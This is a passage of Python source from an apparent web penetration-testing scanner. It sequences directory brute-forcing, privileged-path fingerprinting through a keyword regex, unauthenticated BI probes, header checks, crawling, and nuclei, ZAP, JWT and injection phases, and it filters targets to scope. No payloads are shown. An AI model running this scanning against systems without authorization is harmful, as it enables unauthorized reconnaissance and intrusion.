                        pm.set_phase_status(f"tls#{_ctx_label}", "error", detail=str(e))

                # Phase 1b: subdomain_takeover
                if not _skip("subdomain_takeover"):
                    pm.set_phase_status(f"subdomain_takeover#{_ctx_label}", "running", "Subdomain Takeover")
                    try:
                        _phase_subdomain_takeover(target, _ctx_cfg, pm, out, effective_auth)
                        pm.set_phase_status(f"subdomain_takeover#{_ctx_label}", "complete", "Subdomain Takeover")
                        _save_checkpoint()
                    except Exception as e:
                        vc.error(f"Phase subdomain_takeover [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"subdomain_takeover#{_ctx_label}", "error", detail=str(e))

                # Phase 2c: ffuf
                if not _skip("ffuf"):
                    pm.set_phase_status(f"ffuf#{_ctx_label}", "running", "ffuf Fuzzing")
                    try:
                        _phase_ffuf(target, _ctx_cfg, pm, out, effective_auth)
                        pm.set_phase_status(f"ffuf#{_ctx_label}", "complete", "ffuf Fuzzing")
                        _save_checkpoint()
                    except Exception as e:
                        vc.error(f"Phase ffuf [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"ffuf#{_ctx_label}", "error", detail=str(e))

                # Collect gobuster/feroxbuster endpoints discovered under Role 1.
                # Use Role 1's session for wildcard filtering so false-positive paths
                # are detected consistently with the authenticated surface.
                _hostname   = target["hostname"]
                _ep_timeout = cfg.get("timeout", 10)
                for _gob_name in [f"gobuster_{_hostname}", f"gobuster_files_{_hostname}"]:
                    _gob_path = out.output_path("recon", _gob_name)
                    if _gob_path.exists():
                        try:
                            _raw_gob = _parse_gobuster_with_status(_gob_path, target["url"])
                            _flt_gob = _filter_buster_wildcards(_raw_gob, effective_auth, _ep_timeout)
                            _ep_base.extend(u for u, _, _ in _flt_gob)
                        except Exception:
                            pass
                for _fer_name in [f"feroxbuster_{_hostname}", f"feroxbuster_files_{_hostname}"]:
                    _fer_path = out.output_path("recon", _fer_name)
                    if _fer_path.exists():
                        try:
                            _raw_fer = _parse_feroxbuster_with_status(_fer_path)
                            _flt_fer = _filter_buster_wildcards(_raw_fer, effective_auth, _ep_timeout)
                            _ep_base.extend(u for u, _, _ in _flt_fer)
                        except Exception:
                            pass
                for _wp_u in _wp_discovered_paths:
                    if _is_valid_endpoint_url(_wp_u) and _is_in_scope_url(_wp_u, _scope_hostnames):
                        _ep_base.append(_wp_u)

                # ── Landing-page-as-root: gobuster the parent directory ────
                # When the landing page is a sibling (not a child) of the
                # target URL, standard gobuster only discovers paths under
                # the target.  This pass discovers siblings by enumerating
                # the landing URL's parent directory.
                if _as_landing_url and _as_landing_code in range(200, 300):
                    _lnd_parsed = urllib.parse.urlparse(_as_landing_url)
                    _lnd_parent = _lnd_parsed.path.rsplit("/", 1)[0]
                    _tgt_parsed = urllib.parse.urlparse(target["url"])
                    _tgt_parent = _tgt_parsed.path.rsplit("/", 1)[0]
                    # Run when the parent directory is non-trivial (at least
                    # 2 segments deep) — this discovers siblings of both the
                    # target and the landing page that standard gobuster
                    # (which enumerates children of target["url"]) would miss.
                    # Skip browser-only landing pages (code≠2xx) — the
                    # requests session gets 302'd to login.
                    if (_lnd_parent
                            and _lnd_parent.count("/") >= 2
                            and _as_landing_url.rstrip("/")
                                != target["url"].rstrip("/")):
                        _lnd_base = (f"{_lnd_parsed.scheme}://"
                                     f"{_lnd_parsed.netloc}{_lnd_parent}/")
                        _lnd_gob_out = out.output_path(
                            "recon",
                            f"gobuster_landing_{_hostname}")
                        _lnd_gobuster = _find_tool("gobuster")
                        if _lnd_gobuster:
                            _lnd_wl = cfg.get("wordlist", "")
                            if _lnd_wl and Path(_lnd_wl).exists():
                                _lnd_cmd = [
                                    _lnd_gobuster, "dir",
                                    "-u", _lnd_base,
                                    "-w", _lnd_wl,
                                    "-t", str(cfg.get("threads", 20)),
                                    "-q", "-k",
                                    "-o", str(_lnd_gob_out),
                                ] + _buster_auth_flags(effective_auth)
                                _lnd_gob_ua = _subprocess_ua(effective_auth)
                                if _lnd_gob_ua:
                                    _lnd_cmd += ["--useragent", _lnd_gob_ua]
                                vc.log(
                                    f"[recon] Landing-root gobuster: {_lnd_base}",
                                    "INFO")
                                _gobuster_run(
                                    _lnd_cmd, _lnd_gob_out, "recon-landing", out)
                                if _lnd_gob_out.exists():
                                    try:
                                        _lnd_raw = _parse_gobuster_with_status(
                                            _lnd_gob_out, _lnd_base)
                                        _lnd_flt = _filter_buster_wildcards(
                                            _lnd_raw, effective_auth, _ep_timeout)
                                        _ep_base.extend(
                                            u for u, _, _ in _lnd_flt)
                                        vc.log(
                                            f"[recon] Landing-root gobuster: "
                                            f"{len(_lnd_flt)} endpoint(s) added",
                                            "INFO")
                                    except Exception:
                                        pass

                # Fingerprint Role 1's accessible endpoints for BFLA testing.
                # Only "pages of interest" — paths that are likely to require the
                # highest privilege level — are recorded.  Testing everything Role 1
                # can reach produces noise; restricting to privileged-path candidates
                # keeps BFLA results actionable.
                _bfla_probe_urls: list = list(dict.fromkeys(
                    u for u in _ep_base + list(dict.fromkeys(
                        (target["url"].rstrip("/") + p)
                        for p in (
                            list(json.loads(
                                (out.root / "structure_map.json").read_text()
                            ).get("paths", {}).keys())
                            if (out.root / "structure_map.json").exists() else []
                        )
                    ))
                    if _is_in_scope_url(u, _scope_hostnames)
                ))

                # ── Pages-of-interest filter ────────────────────────────────────
                # Paths whose segments strongly suggest they require elevated
                # privilege are flagged as BFLA candidates.  Generic pages
                # (home, login, static assets, etc.) are excluded.
                _BFLA_INTEREST_RE = re.compile(
                    r'(?i)/('
                    # Administration / management
                    r'admin|administration|manage|management|manager|dashboard|'
                    r'control[\-_]?panel|cp|panel|console|backstage|backoffice|'
                    r'back[\-_]?end|operator|supervisor|moderator|'
                    # User / account management
                    r'users?|accounts?|members?|staff|employees?|personnel|'
                    r'roles?|permissions?|privileges?|grants?|entitlements?|'
                    # Configuration / settings
                    r'config|configuration|settings?|setup|preferences?|options?|'
                    r'properties|env|environment|'
                    # Reporting / analytics
                    r'reports?|reporting|analytics?|audit|audit[\-_]?log|logs?|'
                    r'statistics?|stats?|metrics?|monitoring|'
                    # Billing / finance
                    r'billing|invoices?|payments?|subscriptions?|finance|'
                    r'pricing|orders?|transactions?|'
                    # API write / privileged endpoints
                    r'api/admin|api/internal|api/private|api/manage|api/v\d+/admin|'
                    r'internal|private|restricted|protected|secure|'
                    # Data management
                    r'export|import|backup|restore|migrate|migration|'
                    r'database|db|schema|'
                    # Security / credentials
                    r'security|auth/manage|credentials?|keys?|tokens?|secrets?|'
                    r'certificates?|'
                    # DevOps / deployment
                    r'deploy|deployment|release|ci|cd|pipeline|'
                    r'infrastructure|servers?|nodes?|clusters?|'
                    # Integrations / webhooks
                    r'integrations?|webhooks?|connectors?|'
                    # IBM Cognos / enterprise BI specific
                    r'cognos|bi/v\d|dispatcher|gateway|servlet|ibmcognos'
                    r')'
                    r'(?:[/\-_?#]|$)',
                    re.IGNORECASE,
                )
                # Paths to always exclude regardless of keywords (they're public
                # or static and generate false positives for every role).
                _BFLA_EXCLUDE_RE = re.compile(
                    r'(?i)/('
                    r'login|logout|signin|signout|logon|logoff|'
                    r'static|assets?|css|js|fonts?|images?|img|icons?|'
                    r'favicon|robots\.txt|sitemap|\.well-known|'
                    r'health|healthcheck|ping|status|version|'
                    r'register|signup|password[\-_]?reset|forgot[\-_]?password|'
                    r'error[\-_]?page|errorpage|error\.aspx|error\.html|'
                    r'(?:custom[\-_]?)?error(?:[\-_]handler)?'
                    r')'
                    r'(?:[/\-_?#.]|$)',
                    re.IGNORECASE,
                )

                def _bfla_is_of_interest(url_str: str) -> bool:
                    try:
                        _p = urllib.parse.urlparse(url_str).path or "/"
                    except Exception:
                        _p = url_str
                    if _BFLA_EXCLUDE_RE.search(_p):
                        return False
                    return bool(_BFLA_INTEREST_RE.search(_p))

                _bfla_candidates = [u for u in _bfla_probe_urls
                                    if _bfla_is_of_interest(u)]
                vc.log(
                    f"[bfla] Pages-of-interest filter: {len(_bfla_candidates)}/{len(_bfla_probe_urls)} "
                    "URL(s) selected for BFLA fingerprinting", "INFO")

                _bfla_timeout = cfg.get("timeout", 10)
                for _burl in _bfla_candidates[:200]:
                    try:
                        _br = effective_auth.get(
                            _burl, timeout=_bfla_timeout, allow_redirects=False)
                        if _br.status_code == 200:
                            _br_body = (_br.text or "")[:8000]
                            _br_rel  = urllib.parse.urlparse(_burl).path or "/"
                            # Skip error/catch-all pages — they return 200 to
                            # everyone and are not real privileged content.
                            if _response_is_error_page(_br_body, _br_rel):
                                continue
                            if _matches_error_fingerprint(_br_body):
                                continue
                            _role1_accessible_endpoints.append({
                                "url":        _burl,
                                "status":     _br.status_code,
                                "body_len":   len(_br.text),
                                "body_hash":  hash(_br.text[:4096]),
                                "role1_label": _ctx_label,
                            })
                    except Exception:
                        pass
                vc.log(
                    f"[bfla] Role 1 fingerprint: {len(_role1_accessible_endpoints)} "
                    "accessible privileged endpoints recorded for cross-role testing", "INFO")

            # Sync structure map with all ep_base paths before header/shcheck phases run.
            # Ensures discovered endpoints are registered before phases that test them.
            try:
                _write_structure_map(out, target, extra_urls=list(dict.fromkeys(_ep_base)))
            except Exception:
                pass

            # ── Manual crawl (sparse discovery) ──────────────────────────────
            # If automated discovery produced fewer than 3 non-root paths the
            # target is likely parameter-routed (BI platform, SPA, etc.) and
            # directory brute-forcing has found little of value.  Prompt the user
            # to browse manually; Fracture captures all requests/responses via
            # mitmproxy and adds discovered paths to _ep_base before testing runs.
            # Skip in managed mode — no human operator to browse, and the 180s
            # timeout causes extreme delays in unattended scans.
            if not _is_reduced_ctx and not vc._managed:
                try:
                    _sm_path = out.root / "structure_map.json"
                    if _sm_path.exists():
                        _sm_data = json.loads(_sm_path.read_text(encoding="utf-8"))
                        _sm_real_paths = [
                            p for p in _sm_data.get("paths", {}).keys()
                            if p and p != "/"
                        ]
                        if len(_sm_real_paths) < 3:
                            vc.log(
                                f"[manual-crawl] Only {len(_sm_real_paths)} non-root path(s) "
                                "found by automated discovery — triggering manual crawl",
                                "INFO",
                            )
                            _crawled = _phase_manual_crawl(
                                out, target, cfg, effective_auth, _scope_hostnames
                            )
                            if _crawled:
                                _ep_base = list(dict.fromkeys(_ep_base + _crawled))
                                try:
                                    _write_structure_map(
                                        out, target,
                                        extra_urls=list(dict.fromkeys(_ep_base)),
                                    )
                                except Exception:
                                    pass
                except Exception:
                    pass

            # ── Post-discovery CMS / BI re-analysis ──────────────────────────
            # Check every path in _ep_base against CMS and BI path signatures.
            # The initial probe in _phase_recon only checks the root page body;
            # CMSs/BI tools on sub-paths are invisible unless discovered URLs are
            # also checked.  No additional HTTP probes are needed — all paths are
            # already known from gobuster/feroxbuster/WordPress discovery.
            if not _is_reduced_ctx:
                try:
                    _ep_path_str = " ".join(_ep_base)
                    _cms_path_sigs = {
                        "WordPress":  [r"/wp-admin", r"/wp-login\.php", r"/wp-content/", r"/wp-includes/"],
                        "Drupal":     [r"/sites/default/", r"/drupal/", r"/misc/drupal\.js"],
                        "Joomla":     [r"/components/com_", r"/administrator/index\.php"],
                        "Magento":    [r"/skin/frontend/", r"/pub/static/frontend/", r"/Magento/"],
                        "TYPO3":      [r"/typo3/", r"/typo3conf/", r"/fileadmin/"],
                        "Ghost":      [r"/ghost/api/", r"/content/themes/casper"],
                        "Umbraco":    [r"/umbraco/"],
                        "DotNetNuke": [r"/DesktopModules/", r"/portals/"],
                        "OpenCart":   [r"route=common/", r"/catalog/view/"],
                        "PrestaShop": [r"/modules/ps_"],
                        "Shopify":    [r"/cdn\.shopify\.com/", r"/s/files/"],
                    }
                    _bi_path_sigs = {
                        "Grafana":         [r"/grafana(?:/|$|\?)"],
                        "Kibana":          [r"/app/kibana", r"/kibana/"],
                        "Tableau":         [r"/vizportal/"],
                        "Metabase":        [r"/metabase/"],
                        "Apache Superset": [r"/superset/"],
                        "Redash":          [r"/redash/"],
                        "Prometheus":      [r"/metrics(?:\?|$)", r"/api/v1/targets"],
                        "Zabbix":          [r"/zabbix(?:/|\.php)"],
                        "Nagios":          [r"/nagios(?:/|$)", r"/nagiosxi/"],
                        "Splunk":          [r"/en-US/app/", r"/splunk/"],
                        "Looker":          [r"/looker(?:/|$)"],
                        "IBM Cognos":      [r"/ibmcognos(?:/|$)", r"/bi/v1/", r"/bi/admin/",
                                            r"xts\.run", r"/cgi-bin/cognos\.cgi"],
                    }
                    _disc_cms = [
                        n for n, pats in _cms_path_sigs.items()
                        if any(re.search(p, _ep_path_str, re.I) for p in pats)
                    ]
                    _disc_bi = [
                        n for n, pats in _bi_path_sigs.items()
                        if any(re.search(p, _ep_path_str, re.I) for p in pats)
                    ]
                    if _disc_cms:
                        _write_target_profile(out, cms=_disc_cms)
                        for _dcn in _disc_cms:
                            vc.log(f"[discovery] CMS identified from discovered paths: {_dcn}", "SUCCESS")
                    if _disc_bi:
                        _write_target_profile(out, bi_tools=_disc_bi)
                        for _dbn in _disc_bi:
                            vc.log(f"[discovery] BI tool identified from discovered paths: {_dbn}", "SUCCESS")
                        # Run unauthenticated probes against any newly identified BI tools
                        for _bi_name in _disc_bi:
                            for _bi_path, _bi_desc in _BI_UNAUTH_PROBES.get(_bi_name, []):
                                try:
                                    _bi_r = effective_auth.get(
                                        target["url"].rstrip("/") + _bi_path,
                                        timeout=min(cfg.get("timeout", 10), 6),
                                        allow_redirects=False)
                                    if _bi_r.status_code == 200:
                                        _bi_ev = ""
                                        try:
                                            _bi_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', _bi_path)[:30]
                                            _bi2_rq, _bi2_rp = _save_http_evidence(
                                                out, "recon", f"bi_unauth_{_bi_safe}", _bi_r)
                                            _bi_ev = json.dumps(
                                                [{"url": target["url"].rstrip("/") + _bi_path,
                                                  "req": str(_bi2_rq), "resp": str(_bi2_rp)}])
                                        except Exception:
                                            pass
                                        out.add_finding(
                                            title=f"Unauthenticated {_bi_name} Access: {_bi_desc}",
                                            url=target["url"].rstrip("/") + _bi_path,
                                            port=target["port"], risk="HIGH",
                                            description=(
                                                f"The {_bi_name} {_bi_desc} at '{_bi_path}' "
                                                f"returned HTTP 200 without authentication."
                                            ),
                                            output=f"HTTP 200\n{_bi_r.text[:400]}",
                                            affected=_bi_path,
                                            sources="fracture-discovery",
                                            service=target["scheme"],
                                            output_file=_bi_ev,
                                            owasp="A01:2025 Broken Access Control", nist="AC-3",
                                            remediation=(
                                                f"Require authentication for {_bi_path}. "
                                                f"Place the {_bi_name} interface behind a VPN "
                                                f"or network-level access control."
                                            ),
                                            http_code=200,
                                        )
                                except Exception:
                                    pass
                except Exception:
                    pass

            # Write auth method and login page to target profile (Role 1 context only)
            if not _is_reduced_ctx:
                try:
                    _auth_cfg   = _ctx_cfg.get("auth", {})
                    _auth_meth  = (_auth_cfg.get("auth_method")
                                   or ("enabled" if _auth_cfg.get("enabled") else "none"))
                    _auth_login = (_auth_cfg.get("login_url") or "")
                    _auth_mfa   = _auth_cfg.get("mfa_providers", [])
                    _write_target_profile(out,
                        auth_method=_auth_meth,
                        auth_page=_auth_login,
                        mfa_providers=_auth_mfa,
                    )
                except Exception:
                    pass

            # ── Phase 2: headers ──
            if not _skip("headers"):
                pm.set_phase_status(f"headers#{_ctx_label}", "running", "Security Headers")
                try:
                    _phase_headers(target, _ctx_cfg, pm, out, effective_auth)
                    pm.set_phase_status(f"headers#{_ctx_label}", "complete", "Security Headers")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase headers [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"headers#{_ctx_label}", "error", detail=str(e))

            # ── Phase 2b: shcheck ──
            if not _skip("shcheck"):
                pm.set_phase_status(f"shcheck#{_ctx_label}", "running", "shcheck Header Check")
                try:
                    _ep_shcheck = [
                        u for u in _ep_base
                        if u.rstrip("/") != raw_url.rstrip("/")
                    ]
                    _phase_shcheck(target, _ctx_cfg, pm, out, effective_auth,
                                   extra_urls=_ep_shcheck if _ep_shcheck else None,
                                   wc_baseline=wc_baseline)
                    pm.set_phase_status(f"shcheck#{_ctx_label}", "complete", "shcheck Header Check")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase shcheck [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"shcheck#{_ctx_label}", "error", detail=str(e))

            # ── Session timeout detection (opt-in, Role 1 only) ──
            if not _is_reduced_ctx and _ctx_cfg.get("detect_session_timeout"):
                try:
                    _detected_st = _detect_session_timeout(
                        effective_auth, target, _ctx_cfg, out,
                        canary_url=_as_canary_url or _as_landing_url or "",
                        timeout=_ctx_cfg.get("timeout", 10))
                    if _detected_st is not None:
                        vc.log(f"[session-timeout] Detected idle timeout: "
                               f"~{_detected_st}s", "SUCCESS")
                except Exception as _st_err:
                    vc.error(f"[session-timeout] Detection failed: {_st_err}")

            # ── Phase 3: crawl ──
            if not _skip("crawl"):
                pm.set_phase_status(f"crawl#{_ctx_label}", "running", "Crawl")
                try:
                    # Seed the crawl with the landing URL (if reachable) plus all
                    # endpoints discovered during recon (gobuster/feroxbuster/admin
                    # panel/common-paths probing).  SPAs like React have no HTML
                    # links in their shell page; without these seeds the BFS crawler
                    # has nothing to follow.  The WebForms pages behind these seeds
                    # (Audit/*.aspx, Dashboard/*.aspx, DocLib/*.aspx) contain
                    # traditional <a href> links that the crawler CAN follow.
                    _crawl_seeds: list = []
                    if (_as_landing_url
                            and _as_landing_code in range(200, 300)):
                        _crawl_seeds.append(_as_landing_url)
                    # Add all previously-discovered endpoints as crawl roots.
                    # Dedup against target URL and landing URL to avoid double-visit.
                    _crawl_seen = {
                        target["url"].rstrip("/"),
                        (_as_landing_url or "").rstrip("/"),
                    }
                    for _cseed in _ep_base:
                        _cseed_norm = _cseed.rstrip("/")
                        if (_cseed_norm not in _crawl_seen
                                and _is_in_scope_url(_cseed, _scope_hostnames)):
                            _crawl_seen.add(_cseed_norm)
                            _crawl_seeds.append(_cseed)
                    if _crawl_seeds:
                        vc.log(
                            f"[crawl] {len(_crawl_seeds)} extra seed(s) "
                            f"(landing + recon-discovered endpoints)",
                            "INFO",
                        )
                    crawl_data = _phase_crawl(
                        target, _ctx_cfg, pm, out, effective_auth,
                        extra_seeds=_crawl_seeds or None)
                    pm.set_phase_status(f"crawl#{_ctx_label}", "complete", "Crawl")
                    # Persist role 1 crawl data for reduced contexts
                    if not _is_reduced_ctx:
                        _role1_crawl_data = crawl_data
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase crawl [{_ctx_label}] error: {e}")
                    out.log_error("crawl", "phase-level exception", str(e))
                    pm.set_phase_status(f"crawl#{_ctx_label}", "error", detail=str(e))

            # ── Scope-filter crawl data before any test phase uses it ──────────
            # Discard any links, params, or forms pointing outside scope hostnames.
            # This is the primary guard against testing out-of-scope targets discovered
            # via crawling (e.g. social-media links found on the target page).
            _scoped_links = [
                l for l in crawl_data.get("links", [])
                if _is_in_scope_url(l, _scope_hostnames)
            ]
            _scoped_params = [
                p for p in crawl_data.get("params", [])
                if _is_in_scope_url(p.get("url", ""), _scope_hostnames)
            ]
            _scoped_forms = [
                f for f in crawl_data.get("forms", [])
                if not urllib.parse.urlparse(f.get("action") or "").hostname
                or _is_in_scope_url(f.get("action", ""), _scope_hostnames)
            ]
            _oos_links = len(crawl_data.get("links", [])) - len(_scoped_links)
            if _oos_links:
                vc.log(
                    f"[scope] Dropped {_oos_links} out-of-scope link(s) from crawl data",
                    "INFO",
                )
            crawl_data = {
                **crawl_data,
                "links":  _scoped_links,
                "params": _scoped_params,
                "forms":  _scoped_forms,
            }

            # Accumulate crawl links for access_matrix
            _all_crawl_links.extend(crawl_data.get("links", []))

            # ── Extract SPA routes from JS bundles ──
            try:
                _spa_routes = _extract_spa_routes(
                    target, _ctx_cfg, out, effective_auth, crawl_data,
                    timeout=_ctx_cfg.get("timeout", 10))
                if _spa_routes:
                    for _sr in _spa_routes:
                        _sr_full = _sr.get("full_url", "")
                        if _sr_full and _sr_full not in _all_crawl_links:
                            _all_crawl_links.append(_sr_full)
                    vc.log(f"[spa-routes] Added {len(_spa_routes)} SPA routes "
                           f"to crawl links for access matrix", "INFO")
            except Exception as _spa_err:
                vc.error(f"[spa-routes] Route extraction failed: {_spa_err}")

            # Write structure map from crawl data (first pass — pages, forms, params)
            try:
                _write_structure_map(out, target, crawl_data=crawl_data, source="crawl")
            except Exception:
                pass

            # ── Phase 9: vulnscan (after crawl for full structure_map) ──────────
            # Runs after crawl so nuclei/nikto get the full target list including
            # crawl-discovered endpoints, not just the handful from recon.
            if not _is_reduced_ctx:
                if not _skip("vulnscan"):
                    pm.set_phase_status(f"vulnscan#{_ctx_label}", "running", "Vuln Scan")
                    try:
                        _skip_nikto = (wc_baseline is not None
                                       or crawl_data.get("is_spa", False))
                        _vulnscan_handle = _launch_vulnscan_bg(
                            target, _ctx_cfg, pm, out, effective_auth,
                            fast=args.fast, skip_nikto=_skip_nikto)
                        _vulnscan_ctx_label = _ctx_label
                        vc.log("[vulnscan] nuclei + nikto launched in background", "INFO")
                        _save_checkpoint()
                    except Exception as e:
                        vc.error(f"Phase vulnscan [{_ctx_label}] launch error: {e}")
                        out.log_error("vulnscan", "phase-level exception", str(e))
                        pm.set_phase_status(f"vulnscan#{_ctx_label}", "error", detail=str(e))
                        _vulnscan_handle = None

            # ── Phase 9b: ZAP (background, alongside vulnscan) ──────────────
            if not _is_reduced_ctx:
                if not _skip("zap"):
                    pm.set_phase_status(f"zap#{_ctx_label}", "running", "ZAP Scan")
                    try:
                        _zap_handle = _launch_zap_bg(target, _ctx_cfg, pm, out, effective_auth)
                        if _zap_handle:
                            vc.log("[zap] ZAP daemon launched in background", "INFO")
                        _save_checkpoint()
                    except Exception as e:
                        vc.error(f"Phase zap [{_ctx_label}] launch error: {e}")
                        out.log_error("zap", "phase-level exception", str(e))
                        pm.set_phase_status(f"zap#{_ctx_label}", "error", detail=str(e))
                        _zap_handle = None

            # ── Phase 3c: endpoint tools ──
            _ep_discovered = [
                u for u in (
                    list(_ep_base)
                    + crawl_data.get("links", [])
                    + [f["action"] for f in crawl_data.get("forms", []) if f.get("action")]
                    + [pe["url"] for pe in crawl_data.get("params", []) if pe.get("url")]
                )
                if _is_in_scope_url(u, _scope_hostnames) and _is_valid_endpoint_url(u)
            ]

            # ── Probe security headers on discovered in-scope endpoints ──────────
            # Runs the same checks as fracture-recon (missing security headers) and
            # fracture-headers (data leakage headers) on each discovered endpoint URL.
            _ep_probed: set = set()
            _ep_path_statuses: dict = {}
            for _ep_url in _ep_discovered:
                if _ep_url.rstrip("/") == raw_url.rstrip("/") or _ep_url in _ep_probed:
                    continue
                _ep_probed.add(_ep_url)
                try:
                    _ep_resp = effective_auth.get(
                        _ep_url, timeout=_ep_timeout, allow_redirects=True)
                    _ep_path_statuses[_ep_url] = _ep_resp.status_code
                    _ep_hdrs = _ep_resp.headers
                    _ep_rel  = _url_rel_path(_ep_url, target["url"])
                    _base_absent  = target.get("_base_sec_hdrs_absent",  set())
                    _base_present = target.get("_base_sec_hdrs_present", set())
                    _ep_shdr_ev = ""
                    try:
                        _ep_shdr_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', _ep_url)[:50]
                        _ep_shdr_rq, _ep_shdr_rp = _save_http_evidence(
                            out, "recon", f"ep_headers_{_ep_shdr_safe}", _ep_resp)
                        _ep_shdr_ev = json.dumps(
                            [{"url": _ep_url, "req": str(_ep_shdr_rq), "resp": str(_ep_shdr_rp)}])
                    except Exception:
                        pass
                    for _hn, _hr, _, _hd, _hnist, _hremed in _SECURITY_HEADERS:
                        if _hn == "Strict-Transport-Security" and not target["is_https"]:
                            continue
                        _ep_has = _hn in _ep_hdrs
                        if not _ep_has:
                            if _hn in _base_absent:
                                # Also absent at base — already reported there; skip
                                continue
                            # Present at base but absent at this endpoint — report deviation
                            out.add_finding(
                                title=f"Missing Security Header: {_hn}",
                                url=target["url"], port=target["port"],
                                risk=_hr,
                                description=(
                                    f"The security header '{_hn}' is present on the "
                                    f"base URL but absent from endpoint {_ep_rel}."
                                ),
                                output=f"Missing: {_hn}",
                                affected=_ep_rel,
                                sources="fracture-recon", service=target["scheme"],
                                output_file=_ep_shdr_ev,
                                owasp="A05:2025 Security Misconfiguration", nist=_hnist,
                                remediation=_hremed,
                                http_code=_ep_resp.status_code,
                            )
                        elif _hn in _base_absent:
                            # Absent at base but present at this endpoint — informational
                            out.add_finding(
                                title=f"Inconsistent Security Header Usage: {_hn}",
                                url=target["url"], port=target["port"], risk="INFO",
                                description=(
                                    f"The security header '{_hn}' is present at "
                                    f"endpoint {_ep_rel} but absent from the base URL. "
                                    "This header appears to be applied to specific routes "
                                    "only rather than globally."
                                ),
                                output=f"Present at endpoint: {_hn}: {_ep_hdrs.get(_hn, '')}",
                                affected=_ep_rel,
                                sources="fracture-recon", service=target["scheme"],
                                output_file=_ep_shdr_ev,
                                owasp="A05:2025 Security Misconfiguration", nist=_hnist,
                                remediation=(
                                    "Ensure security headers are applied consistently "
                                    "across all routes. Configure them globally at the "
                                    "server or middleware level."
                                ),
                                http_code=_ep_resp.status_code,
                            )
                    _ep_svr = _ep_hdrs.get("Server", "")
                    if _ep_svr:
                        out.add_finding(
                            title="Information Disclosure: Server Header",
                            url=target["url"], port=target["port"], risk="LOW",
                            description="The HTTP Server response header reveals the web server software name and version, reducing the attacker's reconnaissance effort needed to identify version-specific vulnerabilities.",
                            output=f"Server: {_ep_svr}",
                            affected=_ep_rel,
                            sources="fracture-headers", service=target["scheme"],
                            output_file=_ep_shdr_ev,
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation="Remove or genericise the Server response header in the web server configuration (e.g., ServerTokens Prod in Apache; server_tokens off in nginx).",
                            http_code=_ep_resp.status_code,
                            highlights=[f"Server: {_ep_svr}"],
                        )
                    _ep_xpb = _ep_hdrs.get("X-Powered-By", "")
                    if _ep_xpb:
                        out.add_finding(
                            title="Information Disclosure: X-Powered-By Header",
                            url=target["url"], port=target["port"], risk="LOW",
                            description="The X-Powered-By response header discloses the application framework, language, or runtime version, reducing the attacker's effort needed to identify version-specific vulnerabilities.",
                            output=f"X-Powered-By: {_ep_xpb}",
                            affected=_ep_rel,
                            sources="fracture-headers", service=target["scheme"],
                            output_file=_ep_shdr_ev,
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation='Remove or suppress the X-Powered-By header at the application framework or reverse-proxy level (e.g., app.disable("x-powered-by") in Express; Header unset X-Powered-By in Apache).',
                            http_code=_ep_resp.status_code,
                            highlights=[f"X-Powered-By: {_ep_xpb}"],
                        )
                    _ep_aspnet = (
                        _ep_hdrs.get("X-AspNet-Version", "")
                        or _ep_hdrs.get("X-AspNetMvc-Version", "")
                    )
                    if _ep_aspnet:
                        out.add_finding(
                            title="Information Disclosure: X-AspNet-Version Header",
                            url=target["url"], port=target["port"], risk="LOW",
                            description="The X-AspNet-Version response header reveals the exact ASP.NET framework version, aiding an attacker in identifying applicable CVEs or version-specific attack techniques.",
                            output=f"X-AspNet-Version: {_ep_aspnet}",
                            affected=_ep_rel,
                            sources="fracture-headers", service=target["scheme"],
                            output_file=_ep_shdr_ev,
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation='Disable the header by setting enableVersionHeader="false" in the httpRuntime element of web.config.',
                            http_code=_ep_resp.status_code,
                            highlights=[f"X-AspNet-Version: {_ep_aspnet}"],
                        )
                except Exception:
                    pass

            if _ep_discovered and not _is_reduced_ctx:
                _et_key = f"endpoint_tools#{_ctx_label}"
                if pm.is_phase_complete(_et_key):
                    vc.log(f"[endpoint_tools] Already complete — skipping (checkpoint)", "INFO")
                else:
                    pm.set_phase_status(_et_key, "running", "Endpoint Tools")
                    try:
                        _phase_endpoint_tools(_ep_discovered, target, _ctx_cfg, pm, out,
                                              effective_auth, wc_baseline=wc_baseline,
                                              scope_hostnames=_scope_hostnames)
                        pm.set_phase_status(_et_key, "complete", "Endpoint Tools")
                        _save_checkpoint()
                    except Exception as e:
                        vc.error(f"Phase endpoint_tools [{_ctx_label}] error: {e}")
                        out.log_error("endpoint_tools", "phase-level exception", str(e))
                        pm.set_phase_status(_et_key, "error", detail=str(e))
                # Update structure map with endpoint_tools-discovered URLs and their HTTP status codes
                try:
                    _write_structure_map(out, target,
                                        path_statuses=_ep_path_statuses,
                                        extra_urls=_ep_discovered)
                except Exception:
                    pass

            # ── Phase 3b: jwt ──
            if not _skip("jwt"):
                pm.set_phase_status(f"jwt#{_ctx_label}", "running", "JWT Testing")
                try:
                    _phase_jwt(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"jwt#{_ctx_label}", "complete", "JWT Testing")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase jwt [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"jwt#{_ctx_label}", "error", detail=str(e))

            # ── Phase 4: injection ──
            # Pre-injection WAF health check: detect session termination or IP
            # block before running injection probes that depend on a valid session.
            if _scan_waf_cdn and effective_auth is not None:
                _waf_session_health(
                    target["url"], effective_auth, cfg.get("timeout", 10),
                    out, target, _scan_waf_cdn, role_label=_ctx_label,
                )
            if not _skip("injection"):
                pm.set_phase_status(f"injection#{_ctx_label}", "running", "Injection Testing")
                try:
                    _phase_injection(target, _ctx_cfg, pm, out, effective_auth, crawl_data,
                                     fast=args.fast, waf_cdn=_scan_waf_cdn)
                    pm.set_phase_status(f"injection#{_ctx_label}", "complete", "Injection Testing")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase injection [{_ctx_label}] error: {e}")
                    out.log_error("injection", "phase-level exception", str(e))
                    pm.set_phase_status(f"injection#{_ctx_label}", "error", detail=str(e))

            # ── Phase 5: traversal ──
            if not _skip("traversal"):
